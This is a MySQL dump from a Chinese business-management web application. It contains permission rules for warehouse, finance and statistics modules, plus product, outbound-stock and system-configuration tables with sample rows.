INSERT INTO `xy_auth_rule` VALUES ('414', '2', '413', 'home/tousu/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('415', '2', '413', 'home/tousu/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('416', '2', '413', 'home/tousu/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('417', '2', '413', 'home/tousu/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('418', '2', '413', 'home/tousu/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('419', '0', '0', 'home/cangku/index', '仓库管理', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('420', '1', '419', 'home/chanpin/index', '产品管理', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('421', '2', '420', 'home/chanpin/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('422', '2', '420', 'home/chanpin/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('423', '2', '420', 'home/chanpin/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('424', '2', '420', 'home/chanpin/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('425', '2', '420', 'home/chanpin/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('426', '2', '420', 'home/chanpin/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('427', '1', '419', 'home/ruku/index', '入库管理', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('428', '2', '427', 'home/ruku/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('429', '2', '427', 'home/ruku/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('430', '2', '427', 'home/ruku/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('431', '2', '427', 'home/ruku/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('432', '2', '427', 'home/ruku/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('433', '2', '427', 'home/ruku/shenhe', '审核', '1', '1', '', '5');
INSERT INTO `xy_auth_rule` VALUES ('434', '2', '427', 'home/ruku/dayin', '打印', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('435', '2', '427', 'home/ruku/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('436', '2', '427', 'home/ruku/dshenhe', '待审核', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('437', '1', '419', 'home/rukus/index', '入库明细表', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('438', '2', '437', 'home/rukus/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('439', '2', '437', 'home/rukus/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('440', '2', '437', 'home/rukus/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('441', '2', '420', 'home/chanpin/baojing', '库存报警', '1', '1', '', '7');
INSERT INTO `xy_auth_rule` VALUES ('442', '1', '419', 'home/chuku/index', '出库管理', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('443', '2', '442', 'home/chuku/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('444', '2', '442', 'home/chuku/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('445', '2', '442', 'home/chuku/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('446', '2', '442', 'home/chuku/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('447', '2', '442', 'home/chuku/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('448', '2', '442', 'home/chuku/shenhe', '审核', '1', '1', '', '5');
INSERT INTO `xy_auth_rule` VALUES ('449', '2', '442', 'home/chuku/dayin', '打印', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('450', '2', '442', 'home/chuku/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('451', '2', '442', 'home/chuku/dshenhe', '待审核', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('452', '1', '419', 'home/chukus/index', '出库明细表', '1', '1', '', '7');
INSERT INTO `xy_auth_rule` VALUES ('453', '2', '452', 'home/chukus/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('454', '2', '452', 'home/chukus/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('455', '2', '452', 'home/chukus/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('456', '1', '419', 'home/fahuo/index', '发货记录', '1', '1', '', '11');
INSERT INTO `xy_auth_rule` VALUES ('457', '2', '456', 'home/fahuo/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('458', '2', '456', 'home/fahuo/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('459', '2', '456', 'home/fahuo/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('460', '2', '456', 'home/fahuo/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('461', '2', '456', 'home/fahuo/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('462', '2', '456', 'home/fahuo/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('463', '0', '0', 'home/caiwu/index', '财务管理', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('464', '1', '463', 'home/shou/index', '收款记录', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('465', '2', '464', 'home/shou/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('466', '2', '464', 'home/shou/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('467', '2', '464', 'home/shou/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('468', '2', '464', 'home/shou/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('469', '2', '464', 'home/shou/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('470', '2', '464', 'home/shou/shenhe', '审核', '1', '1', '', '5');
INSERT INTO `xy_auth_rule` VALUES ('471', '2', '464', 'home/shou/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('472', '2', '464', 'home/shou/dshenhe', '待审核', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('473', '1', '463', 'home/fukuan/index', '付款记录', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('474', '2', '473', 'home/fukuan/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('475', '2', '473', 'home/fukuan/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('476', '2', '473', 'home/fukuan/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('477', '2', '473', 'home/fukuan/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('478', '2', '473', 'home/fukuan/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('479', '2', '473', 'home/fukuan/shenhe', '审核', '1', '1', '', '5');
INSERT INTO `xy_auth_rule` VALUES ('480', '2', '473', 'home/fukuan/dshenhe', '待审核', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('481', '2', '473', 'home/fukuan/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('482', '1', '463', 'home/kaipiao/index', '开票记录', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('483', '2', '482', 'home/kaipiao/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('484', '2', '482', 'home/kaipiao/add', '新增', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('485', '2', '482', 'home/kaipiao/edit', '编辑', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('486', '2', '482', 'home/kaipiao/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('487', '2', '482', 'home/kaipiao/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('488', '2', '482', 'home/kaipiao/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('489', '1', '1', 'home/public/clear', '清理缓存', '1', '1', '', '20');
INSERT INTO `xy_auth_rule` VALUES ('490', '0', '0', 'home/tongji/index', '统计分析', '1', '1', '', '9');
INSERT INTO `xy_auth_rule` VALUES ('491', '1', '490', 'home/fxcust/index', '客户管理', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('492', '2', '491', 'home/fxcust/xuqiu', '需求分析', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('493', '2', '491', 'home/fxcust/laiyuan', '来源分析', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('494', '2', '491', 'home/fxcust/jinzhan', '进展分析', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('495', '2', '491', 'home/fxcust/yewu', '业务员分析', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('496', '2', '491', 'home/fxcust/qushi', '增长趋势', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('497', '2', '491', 'home/fxcust/', '综合分析', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('498', '1', '490', 'home/fxhetong/index', '合同管理', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('499', '2', '498', 'home/fxhetong/qushi', '增长趋势(数量)', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('500', '2', '498', 'home/fxhetong/qushijin', '签约金额', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('501', '2', '498', 'home/fxhetong/qushishou', '已收款', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('502', '2', '498', 'home/fxhetong/qushiwei', '未收款', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('503', '2', '498', 'home/fxhetong/qushipiao', '已开票', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('504', '2', '498', 'home/fxhetong/type', '类型分析', '1', '1', '', '5');
INSERT INTO `xy_auth_rule` VALUES ('505', '2', '498', 'home/fxhetong/jingban', '业务员分析', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('506', '2', '498', 'home/fxhetong/daoqi', '到期合同', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('507', '1', '490', 'home/fxchanpin/index', '仓库管理', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('508', '2', '507', 'home/fxchanpin/rukus', '入库分析', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('509', '2', '507', 'home/fxchanpin/chukus', '出库分析', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('510', '2', '507', 'home/tjchanpin/index', '库存统计', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('511', '2', '507', 'home/tjchanpin/dayin', '库存统计打印', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('512', '1', '490', 'home/fxcaiwu/index', '财务管理', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('513', '2', '512', 'home/fxcaiwu/shou', '收款分析', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('514', '2', '512', 'home/fxcaiwu/fukuan', '付款分析', '1', '1', '', '1');
INSERT INTO `xy_auth_rule` VALUES ('515', '2', '512', 'home/fxcaiwu/leixing', '付款类型', '1', '1', '', '2');
INSERT INTO `xy_auth_rule` VALUES ('516', '2', '512', 'home/fxcaiwu/jingban', '业务员付款分析', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('517', '1', '490', 'home/msgs/index', '消息记录', '1', '1', '', '10');
INSERT INTO `xy_auth_rule` VALUES ('518', '2', '517', 'home/msgs/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('519', '2', '517', 'home/msgs/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('520', '2', '517', 'home/msgs/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('521', '2', '517', 'home/msgs/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('522', '1', '490', 'home/emails/index', '邮件记录', '1', '1', '', '11');
INSERT INTO `xy_auth_rule` VALUES ('523', '2', '522', 'home/emails/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('524', '2', '522', 'home/emails/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('525', '2', '522', 'home/emails/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('526', '2', '522', 'home/emails/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('527', '1', '490', 'home/smss/index', '短信记录', '1', '1', '', '12');
INSERT INTO `xy_auth_rule` VALUES ('528', '2', '527', 'home/smss/view', '查看', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('529', '2', '527', 'home/smss/lock', '锁定', '1', '1', '', '3');
INSERT INTO `xy_auth_rule` VALUES ('530', '2', '527', 'home/smss/del', '删除', '1', '1', '', '4');
INSERT INTO `xy_auth_rule` VALUES ('531', '2', '527', 'home/smss/outxls', '导出', '1', '1', '', '6');
INSERT INTO `xy_auth_rule` VALUES ('532', '1', '490', 'home/tjhetong/index', '业绩统计', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('533', '2', '532', 'home/tjhetong/dayin', '打印', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('537', '2', '390', 'home/hetong/daoqi', '到期', '1', '1', '', '8');
INSERT INTO `xy_auth_rule` VALUES ('535', '1', '490', 'home/tjbiao/index', '老板一张表', '1', '1', '', '0');
INSERT INTO `xy_auth_rule` VALUES ('536', '2', '535', 'home/tjbiao/dayin', '打印', '1', '1', '', '0');

-- ----------------------------
-- Table structure for `xy_case`
-- ----------------------------
DROP TABLE IF EXISTS `xy_case`;
CREATE TABLE `xy_case` (
  `id` int(4) unsigned NOT NULL AUTO_INCREMENT COMMENT 'id',
  `name` varchar(32) DEFAULT NULL COMMENT '姓名',
  `sex` int(1) DEFAULT NULL COMMENT '性别(0男 1女 )',
  `birth` varchar(32) DEFAULT NULL COMMENT '出生日期',
  `weight` varchar(32) DEFAULT NULL COMMENT '体重',
  `idcard` varchar(32) DEFAULT NULL,
  `tel` varchar(32) DEFAULT NULL,
  `memberid` int(4) DEFAULT '0',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of xy_case
-- ----------------------------
INSERT INTO `xy_case` VALUES ('2', '11111', '0', '1570377600', '1111', '213', '111', '0');
INSERT INTO `xy_case` VALUES ('3', '123', '0', '1539532800', '213', '213', '213', '0');

-- ----------------------------
-- Table structure for `xy_chanpin`
-- ----------------------------
DROP TABLE IF EXISTS `xy_chanpin`;
CREATE TABLE `xy_chanpin` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `title` varchar(100) NOT NULL,
  `bianhao` varchar(50) NOT NULL,
  `fenlei` varchar(50) NOT NULL,
  `type` varchar(200) NOT NULL,
  `danwei` varchar(20) NOT NULL,
  `rjiage` int(11) NOT NULL,
  `xjiage` int(11) NOT NULL,
  `kucun` int(11) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=10 DEFAULT CHARSET=utf8 COMMENT='产品管理';

-- ----------------------------
-- Records of xy_chanpin
-- ----------------------------
INSERT INTO `xy_chanpin` VALUES ('1', '1', '陈高明', '2015-06-02 09:28:48', '1', '陈高明', '2015-06-02 09:29:13', '1', '客户管理管理系统', 'crm', '软件服务', '通用的可以适当定制', '套', '2000', '6800', '1999', '管理客户的');
INSERT INTO `xy_chanpin` VALUES ('2', '1', '陈高明', '2015-06-02 09:33:47', '1', '陈高明', '2015-06-02 09:36:45', '1', '加密狗', 'jmg01', '软件配套', '62K', '只', '30', '50', '33', '一套软件配一个');
INSERT INTO `xy_chanpin` VALUES ('3', '1', '陈高明', '2015-06-02 09:33:47', '1', '陈高明', '2015-06-02 09:36:34', '1', '小票打印机', 'sfz01', '软件配套', '热敏纸', '台', '1000', '1500', '12', '配热敏纸5卷');
INSERT INTO `xy_chanpin` VALUES ('4', '1', '陈高明', '2015-06-02 09:35:58', '1', '陈高明', '2015-06-02 09:36:25', '1', '美容院管理系统', 'CRM01', '软件服务', '通用', '套', '2000', '5800', '1999', '');
INSERT INTO `xy_chanpin` VALUES ('9', '16', '王晓丹', '2015-07-30 15:17:25', '16', '王晓丹', '2015-07-30 15:17:49', '1', 'd', 'd', '软件服务', '', '套', '111', '1', '0', '');

-- ----------------------------
-- Table structure for `xy_chuku`
-- ----------------------------
DROP TABLE IF EXISTS `xy_chuku`;
CREATE TABLE `xy_chuku` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `uid` int(11) NOT NULL,
  `uname` varchar(50) NOT NULL,
  `addtime` datetime NOT NULL,
  `uuid` int(11) NOT NULL,
  `uuname` varchar(50) NOT NULL,
  `updatetime` datetime NOT NULL,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `bianhao` varchar(50) NOT NULL,
  `number` varchar(50) NOT NULL,
  `shuliang` int(11) NOT NULL,
  `title` varchar(500) NOT NULL,
  `shijian` date NOT NULL,
  `jingban` varchar(50) NOT NULL,
  `shenheren` varchar(50) NOT NULL,
  `shenhe` varchar(50) NOT NULL,
  `hid` varchar(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=utf8 COMMENT='出库记录';

-- ----------------------------
-- Records of xy_chuku
-- ----------------------------
INSERT INTO `xy_chuku` VALUES ('1', '1', '陈高明', '2015-06-02 09:58:24', '0', '', '0000-00-00 00:00:00', '1', '1506020001', '1506020001', '3', '客户管理管理系统,加密狗,小票打印机', '2015-06-02', '陈高明', '陈高明', '审核通过', '1');
INSERT INTO `xy_chuku` VALUES ('2', '1', '陈高明', '2015-06-02 10:20:53', '0', '', '0000-00-00 00:00:00', '1', '1506020002', '1506020002', '4', '美容院管理系统,小票打印机,加密狗', '2015-06-02', '王旭东', '陈高明', '审核通过', '2');
INSERT INTO `xy_chuku` VALUES ('3', '1', '陈高明', '2015-07-09 13:03:44', '0', '', '0000-00-00 00:00:00', '1', '', '150709440003', '0', '美容院管理系统', '2015-07-09', '陈高明', '陈高明', '审核通过', '');
INSERT INTO `xy_chuku` VALUES ('4', '1', '陈高明', '2015-07-23 17:12:46', '0', '', '0000-00-00 00:00:00', '1', '150713220009', '150723460004', '2147483647', '11', '2015-07-23', '', '陈高明', '审核通过', '15');

-- ----------------------------
-- Table structure for `xy_chukus`
-- ----------------------------
DROP TABLE IF EXISTS `xy_chukus`;
CREATE TABLE `xy_chukus` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `status` tinyint(1) NOT NULL DEFAULT '1',
  `bianhao` varchar(100) NOT NULL,
  `title` varchar(200) NOT NULL,
  `type` varchar(255) NOT NULL,
  `danwei` varchar(21) NOT NULL,
  `shuliang` int(11) NOT NULL,
  `beizhu` varchar(255) NOT NULL,
  `shenhe` varchar(50) NOT NULL,
  `xid` int(11) NOT NULL,
  `edit` tinyint(1) NOT NULL,
  `jingban` varchar(50) NOT NULL,
  `shijian` date NOT NULL,
  `fenlei` varchar(50) NOT NULL,
  `hid` int(11) NOT NULL,
  `number` varchar(50) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=9 DEFAULT CHARSET=utf8 COMMENT='出库明细表';

-- ----------------------------
-- Records of xy_chukus
-- ----------------------------
INSERT INTO `xy_chukus` VALUES ('1', '1', 'crm', '客户管理管理系统', '通用的可以适当定制', '套', '1', '', '审核通过', '1', '0', '陈高明', '2015-06-02', '软件服务', '1', '1506020001');
INSERT INTO `xy_chukus` VALUES ('2', '1', 'jmg01', '加密狗', '62K', '只', '1', '', '审核通过', '1', '0', '陈高明', '2015-06-02', '软件配套', '1', '1506020001');
INSERT INTO `xy_chukus` VALUES ('3', '1', 'sfz01', '小票打印机', '热敏纸', '台', '1', '', '审核通过', '1', '0', '陈高明', '2015-06-02', '软件配套', '1', '1506020001');
INSERT INTO `xy_chukus` VALUES ('4', '1', 'CRM01', '美容院管理系统', '通用', '套', '1', '', '审核通过', '2', '0', '王旭东', '2015-06-02', '软件服务', '2', '1506020002');
INSERT INTO `xy_chukus` VALUES ('5', '1', 'sfz01', '小票打印机', '热敏纸', '台', '2', '', '审核通过', '2', '0', '王旭东', '2015-06-02', '软件配套', '2', '1506020002');
INSERT INTO `xy_chukus` VALUES ('6', '1', 'jmg01', '加密狗', '62K', '只', '1', '', '审核通过', '2', '0', '王旭东', '2015-06-02', '软件配套', '2', '1506020002');
INSERT INTO `xy_chukus` VALUES ('7', '1', 'CRM01', '美容院管理系统', '通用', '套', '0', '', '审核通过', '3', '0', '陈高明', '2015-07-09', '软件服务', '0', '');

-- ----------------------------
-- Table structure for `xy_config`
-- ----------------------------
DROP TABLE IF EXISTS `xy_config`;
CREATE TABLE `xy_config` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `fenlei` varchar(20) NOT NULL COMMENT '分类',
  `name` varchar(30) NOT NULL DEFAULT '' COMMENT '配置名称',
  `type` tinyint(3) NOT NULL DEFAULT '0' COMMENT '配置类型',
  `title` varchar(50) NOT NULL DEFAULT '' COMMENT '配置说明',
  `extra` varchar(255) NOT NULL DEFAULT '' COMMENT '配置值',
  `remark` varchar(100) NOT NULL COMMENT '配置说明',
  `addtime` datetime NOT NULL COMMENT '创建时间',
  `updatetime` datetime NOT NULL COMMENT '更新时间',
  `status` tinyint(4) NOT NULL DEFAULT '1' COMMENT '状态',
  `value` text NOT NULL COMMENT '配置值',
  `sort` smallint(3) NOT NULL DEFAULT '0' COMMENT '排序',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=69 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of xy_config
-- ----------------------------
INSERT INTO `xy_config` VALUES ('1', '系统', 'CONFIG_TYPE_LIST', '3', '配置类型列表', '', '主要用于数据解析和页面表单的生成', '2015-02-01 14:39:41', '2015-02-25 10:44:48', '1', '0:数字\n1:字符\n2:文本\n3:数组\n4:枚举', '0');
INSERT INTO `xy_config` VALUES ('2', '基础', 'PERPAGE', '0', '每页条数', '', '列表分页条数', '2015-02-01 14:49:47', '2015-06-02 12:00:53', '1', '50', '0');
INSERT INTO `xy_config` VALUES ('3', '基础', 'SEARCHKEY', '3', '参与搜索的字段名', '', '', '2015-02-01 14:56:03', '2015-05-31 16:46:34', '1', 'title\nbiaoti\nmingcheng\nname\nvalue\nxingming\ndianhua\nphone\ntel\nqq\nemail\nbeizhu\nlaiyuan\njinzhan\nsfz\ncontent\nusername\nuname\nuuname\nurl\nip\ntruename\ndepname\nposname\ntype\nleixing\ndanwei\nzhiwei\ncontent\nneirong\njinban\njingban\nshenhe\nshenheren\nbianhao\nnumber', '0');
INSERT INTO `xy_config` VALUES ('4', '系统', 'DATA_CACHE_TIME', '0', '数据缓存时间', '', '数据缓存有效期 0表示永久缓存', '2015-02-01 15:05:20', '2015-02-25 10:44:23', '1', '14400', '0');
INSERT INTO `xy_config` VALUES ('5', '系统', 'SESSION_PREFIXX', '1', 'session 前缀', '', '', '2015-02-01 15:07:09', '2015-02-25 10:44:17', '1', 'lygxykj', '0');
INSERT INTO `xy_config` VALUES ('6', '系统', 'WEB_SITE_TITLE', '2', '系统名称', '', '', '2015-02-01 15:17:46', '2015-07-19 18:48:56', '1', '信友科技管理系统', '0');
INSERT INTO `xy_config` VALUES ('11', '模型', 'MODEL_B_SHOW', '3', '字段模型表单显示', '', '', '2015-02-01 22:12:54', '2015-02-25 10:43:02', '1', '0:不显示\n1:都显示\n2:新增显示\n3:编辑显示', '0');
INSERT INTO `xy_config` VALUES ('7', '系统', 'DATA_BACKUP_PATH', '1', '数据库备份路径', '', '', '2015-02-01 15:55:43', '2015-07-07 09:18:30', '1', 'data', '0');
INSERT INTO `xy_config` VALUES ('8', '系统', 'DATA_BACKUP_PART_SIZE', '0', '数据库备份卷大小', '', '该值用于限制压缩后的分卷最大长度。单位：B；建议设置20M', '2015-02-01 15:56:41', '2015-02-25 10:44:00', '1', '20971520', '0');
INSERT INTO `xy_config` VALUES ('9', '系统', 'DATA_BACKUP_COMPRESS', '4', '数据库备份文件是否启用压缩', '0:不压缩\n1:启用压缩', '压缩备份文件需要PHP环境支持gzopen,gzwrite函数', '2015-02-01 15:57:49', '2015-07-07 05:24:13', '1', '1', '0');
INSERT INTO `xy_config` VALUES ('10', '系统', 'DATA_BACKUP_COMPRESS_LEVEL', '4', '数据库备份文件压缩级别', '1:普通\n4:一般\n9:最高', '数据库备份文件的压缩级别，该配置在开启压缩时生效', '2015-02-01 15:58:48', '2015-02-25 10:43:25', '1', '9', '0');
INSERT INTO `xy_config` VALUES ('12', '模型', 'MODEL_L_SHOW', '3', '字段模型列表显示', '', '', '2015-02-02 14:55:31', '2015-02-25 10:42:53', '1', '0:不显示\n1:显示', '0');
INSERT INTO `xy_config` VALUES ('13', '模型', 'MODEL_B_ATTR', '3', '数据模型中表单属性', '', '', '2015-02-02 15:46:08', '2015-04-15 18:16:56', '1', '0:文本框\n1:文本域\n2:密码框\n3:日期框\n4:编辑器\n5:微调器\n6:单选框\n7:多选框\n8:下拉框\n9:查找带回\n10:上传附件\n11:日期时间框\n12:隐藏字段', '0');
INSERT INTO `xy_config` VALUES ('14', '模型', 'MODEL_B_ISMUST', '3', '数据模型中是否必填', '', '', '2015-02-02 16:05:26', '2015-02-28 11:37:48', '1', '0:非必填\n1:必填\n2:必填日期\n3:必填手机号码\n4:必填EMAIL\n5:必填字母\n6:必填身份证号码\n7:必填中文\n8:必填数字\n9:必填日期时间', '0');
INSERT INTO `xy_config` VALUES ('15', '模型', 'MODEL_B_ISSORT', '3', '数据模型中的字段是否参与排序', '', '', '2015-02-02 19:53:07', '2015-02-25 10:42:27', '1', '0:不参与\n1:参与', '0');
INSERT INTO `xy_config` VALUES ('16', '基础', 'BASE_SEX', '3', '性别', '', '', '2015-02-02 21:21:58', '2015-02-25 10:28:07', '1', '0:男\n1:女', '0');
INSERT INTO `xy_config` VALUES ('17', '基础', 'BASE_XUELI', '3', '学历', '', '', '2015-02-02 21:23:26', '2015-02-25 10:28:01', '1', '0:中专\n1:大专\n2:本科\n3:硕士\n4:博士', '0');
INSERT INTO `xy_config` VALUES ('18', '基础', 'CONFIG_CLASS', '3', '配置分类', '', '', '2015-02-25 10:22:21', '2015-05-13 15:31:07', '1', '0:系统\n1:基础\n2:模型', '0');
INSERT INTO `xy_config` VALUES ('41', '模型', 'MODEL_B_ISSEARCH', '3', '模型中是否参与搜索', '', '', '2015-04-16 09:18:09', '0000-00-00 00:00:00', '1', '0:不参与\n1:参与', '0');
INSERT INTO `xy_config` VALUES ('39', '系统', 'WEB_COMPANY_NAME', '2', '单位名称', '', '', '2015-04-05 11:26:27', '2015-07-07 12:13:09', '1', '连云港信友科技有限公司\n', '0');
INSERT INTO `xy_config` VALUES ('38', '模型', 'MODEL_F_TYPE', '3', '图表类型', '', '', '2015-03-06 14:16:26', '0000-00-00 00:00:00', '1', '0:不生成\n1:3D饼图\n2:柱状图\n3:曲线图\n4:环状图\n5:柱商务图', '0');
INSERT INTO `xy_config` VALUES ('42', '基础', 'BASE_ZU', '3', '参数组别', '', '', '2015-04-19 11:02:43', '0000-00-00 00:00:00', '1', '少儿A组：3-6岁\n少儿B组：7-9岁\n少年A组：10-12岁\n少年B组：13-18岁\n青年组：19-40岁\n中老年组：40岁以上', '0');
INSERT INTO `xy_config` VALUES ('43', '基础', 'BASE_XM', '3', '参数项目', '', '', '2015-04-19 11:17:43', '0000-00-00 00:00:00', '1', '大众才艺类\n书画美术类\n全民阅读', '0');
INSERT INTO `xy_config` VALUES ('52', '基础', 'CUST_LAIYUAN', '3', '客户来源', '', '', '2015-05-20 10:04:59', '0000-00-00 00:00:00', '1', '百度推广\n电话营销\n主动联系\n客户介绍', '0');
INSERT INTO `xy_config` VALUES ('53', '基础', 'CUSTGD_TYPE', '3', '跟单方式', '', '', '2015-05-20 10:52:25', '0000-00-00 00:00:00', '1', '电话沟通\nQQ/旺旺\n电子邮箱\n上门拜访', '0');
INSERT INTO `xy_config` VALUES ('54', '基础', 'CUSTGD_JINZHAN', '3', '跟单进展阶段', '', '', '2015-05-20 10:56:47', '2015-07-07 10:43:24', '1', '需求整理\n选择比较\n成交客户\n他人签单', '0');
